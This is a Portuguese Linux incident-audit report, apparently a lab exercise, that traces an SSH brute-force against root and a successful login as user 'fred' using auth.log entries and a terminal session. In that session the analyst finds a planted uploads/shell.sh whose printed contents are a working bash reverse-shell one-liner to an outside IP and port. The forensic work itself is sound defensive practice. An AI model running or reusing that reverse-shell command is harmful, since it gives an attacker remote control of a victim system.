# Auditoria de Sistemas Linux e Análise Avançada de Logs

## 1. Identificação do Incidente
* **IP do Atacante:** `192.168.158.99`
* **Utilizador Afetado:** `fred`
* **Hora Exata do Comprometimento (Timestamp):** Jul 19 20:02:54

## 2. Contagem de Tentativas por IP (Extração)
* **5** tentativas de autenticação falhadas vindas do IP `192.168.158.99`

## 3. Linha Temporal do Ataque (Timeline)
* **19:58:16 às 20:00:49** – O atacante realizou múltiplas tentativas consecutivas de força bruta (brute force) focadas no utilizador `root`, resultando em falhas de autenticação (`Failed password`).
* **20:02:54** – O atacante alterou o alvo para o utilizador `fred` e obteve sucesso na autenticação (`Accepted password`).

## 4. Evidências dos Logs (`/var/log/auth.log`)

### Isolamento de Tentativas Falhadas:
```text
Jul 19 19:58:16 ip-10-130-146-50 sshd[1279]: Failed password for root from 192.168.158.99 port 60479 ssh2
Jul 19 19:58:47 ip-10-130-146-50 sshd[1279]: message repeated 2 times: [ Failed password for root from 192.168.158.99 port 60479 ssh2]
Jul 19 19:59:37 ip-10-130-146-50 sshd[1289]: Failed password for root from 192.168.158.99 port 54963 ssh2
Jul 19 20:00:30 ip-10-130-146-50 sshd[1289]: Failed password for root from 192.168.158.99 port 54963 ssh2
Jul 19 20:00:49 ip-10-130-146-50 sshd[1289]: Failed password for root from 192.168.158.99 port 54963 ssh2

Jul 19 20:02:54 ip-10-130-146-50 sshd[1380]: Accepted password for fred from 192.168.158.99 port 58406 ssh2

C:\Users\User>ssh fred@10.130.146.50
fred@10.130.146.50's password:
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-139-generic x86_64)

System information as of Sun 19 Jul 20:02:54 UTC 2026

Last login: Tue Apr 20 10:14:19 2021
fred@ip-10-130-146-50:~$ ls -la
total 36
drwxr-xr-x 6 fred fred 4096 Apr 20  2021 .
drwxr-xr-x 4 root root 4096 May  3 10:15 ..
-rw-r--r-- 1 fred fred  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 fred fred 3771 Apr  4  2018 .bashrc
drwx------ 2 fred fred 4096 Apr 20  2021 .cache
drwx------ 3 fred fred 4096 Apr 20  2021 .gnupg
drwxrwxr-x 3 fred fred 4096 Apr 20  2021 .local
-rw-r--r-- 1 fred fred  807 Apr  4  2018 .profile
-rw-r--r-- 1 fred fred    0 Apr 20  2021 .sudo_as_admin_successful
drwxrwxr-x 3 fred fred 4096 Apr 20  2021 Templates

fred@ip-10-130-146-50:~$ cd /var/www/html && ls -la
total 88
drwxr-xr-x 6 root root  4096 Apr 20  2021 .
drwxr-xr-x 3 root root  4096 Apr 20  2021 ..
-rw-r--r-- 1 root root  2223 Apr 20  2021 about.html
-rw-r--r-- 1 root root  2636 Apr 20  2021 contact.php
-rw-r--r-- 1 root root  2223 Apr 20  2021 index.html
-rw-r--r-- 1 root root  2956 Apr 20  2021 master.css
-rw-r--r-- 1 root root  1518 Apr 20  2021 product.html
drwxr-xr-x 2 root root 36864 Apr 20  2021 products
-rw-r--r-- 1 root root  3929 Apr 20  2021 products.html
drwxr-xr-x 6 root root  4096 Apr 20  2021 resources
-rw-r--r-- 1 root root    95 Apr 20  2021 robots.txt
drwxr-xr-x 3 root root  4096 Apr 20  2021 static
drwxrwxrwx 2 root root  4096 Apr 20  2021 uploads

fred@ip-10-130-146-50:/var/www/html$ ls -la uploads
total 12
drwxrwxrwx 2 root     root     4096 Apr 20  2021 .
drwxr-xr-x 6 root     root     4096 Apr 20  2021 ..
-rwxrwxrwx 1 www-data www-data   44 Apr 20  2021 shell.sh

fred@ip-10-130-146-50:/var/www/html$ cat uploads/shell.sh
bash -i >& /dev/tcp/192.168.56.24/4242 0>&1

fred@ip-10-130-146-50:/var/www/html$ cd /var/log && grep "Failed password" auth.log
Jul 19 19:58:16 ip-10-130-146-50 sshd[1279]: Failed password for root from 192.168.158.99 port 60479 ssh2
Jul 19 19:58:47 ip-10-130-146-50 sshd[1279]: message repeated 2 times: [ Failed password for root from 192.168.158.99 port 60479 ssh2]
Jul 19 19:59:37 ip-10-130-146-50 sshd[1289]: Failed password for root from 192.168.158.99 port 54963 ssh2
Jul 19 20:00:30 ip-10-130-146-50 sshd[1289]: Failed password for root from 192.168.158.99 port 54963 ssh2
Jul 19 20:00:49 ip-10-130-146-50 sshd[1289]: Failed password for root from 192.168.158.99 port 54963 ssh2

fred@ip-10-130-146-50:/var/log$ grep -E "Accepted password|Accepted publickey" auth.log
Jul 19 20:02:54 ip-10-130-146-50 sshd[1380]: Accepted password for fred from 192.168.158.99 port 58406 ssh2
